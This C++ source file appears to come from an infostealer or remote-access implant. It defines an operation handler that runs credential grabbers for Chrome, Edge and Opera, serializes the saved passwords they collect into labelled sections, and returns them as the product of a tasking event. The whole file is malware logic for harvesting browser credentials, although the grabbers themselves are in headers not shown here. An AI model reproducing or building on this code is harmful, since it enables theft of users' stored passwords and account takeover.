#include "GetAllCredentialsHandler.hpp"

#include "SerializableSection.hpp"
#include "Trace.hpp"
#include "../Grabbers/ChromeCredentialsGrabber.hpp"
#include "../Grabbers/EdgeCredentialsGrabber.hpp"
#include "../Grabbers/OperaCredentialsGrabber.hpp"
#include "Products/TextTypedProduct.hpp"
#include "Utils/Strings.hpp"

GetAllCredentialsHandler::GetAllCredentialsHandler(std::unique_ptr<Event> operation_event):
	IOperationHandler(std::move(operation_event))
{
}

std::wstring GetAllCredentialsHandler::format_source(const std::wstring& source)
{
	return std::wstring{L"[Credentials "} + source + L"]";
}

std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential)
{
	return Strings::concat(std::wstring(L"#Credential"), std::wstring(L"\n"), credential.serialize());
}

void GetAllCredentialsHandler::run()
{
	std::vector<SerializableSection> sections;

	for (const auto& grabber : make_grabbers())
	{
		std::optional<Credentials> credentials = std::nullopt;
		try
		{
			credentials = grabber->grab_credentials();
		}
		CATCH_AND_TRACE();

		SerializableSection section{.name = format_source(grabber->source()), .objects = {}};

		if (credentials.has_value())
		{
			section.objects.insert(
				section.objects.end(),
				std::make_move_iterator(credentials->begin()),
				std::make_move_iterator(credentials->end())
			);
		}
		else
		{
			section.objects.emplace_back(std::make_unique<NotSupported>());
		}

		sections.push_back(std::move(section));
	}
	append(std::make_unique<TextTypedProduct>(SerializableSection::serialize_sections(sections)));
	finished();
}

std::vector<CredentialsGrabber::Ptr> GetAllCredentialsHandler::make_grabbers()
{
	std::vector<CredentialsGrabber::Ptr> result;

	result.push_back(std::make_unique<ChromeCredentialsGrabber>());
	result.push_back(std::make_unique<EdgeCredentialsGrabber>());
	result.push_back(std::make_unique<OperaCredentialsGrabber>());

	return result;
}
